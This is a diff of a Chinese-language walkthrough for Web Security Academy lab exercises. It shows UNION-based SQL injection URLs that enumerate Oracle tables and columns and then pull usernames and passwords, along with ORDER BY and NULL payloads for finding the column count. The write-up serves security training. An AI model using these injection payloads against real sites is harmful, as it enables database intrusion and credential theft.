@@ -52,3 +52,11 @@
 > 思路与上一个Lab一样，不过后端是Oracle。
 
 通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+all_tables--+`查询所有表名，我们先选择`USERS_VSCHVE`这个表进行查询`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+all_tab_columns+where+table_name=%27USERS_VSCHVE%27--+`，然后查询用户名密码`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+USERNAME_LBWZOB,PASSWORD_JXBWPH+from+USERS_VSCHVE--+`，最后登录即可。
+
+## SQL injection UNION attack, determining the number of columns returned by the query
+
+> 关键点在于通过`order by`判断有几列，然后根据题目要求添加一行空数据即可。
+
+`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27%20order%20by%203--+`
+
+`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27union+select+null,null,null--+`
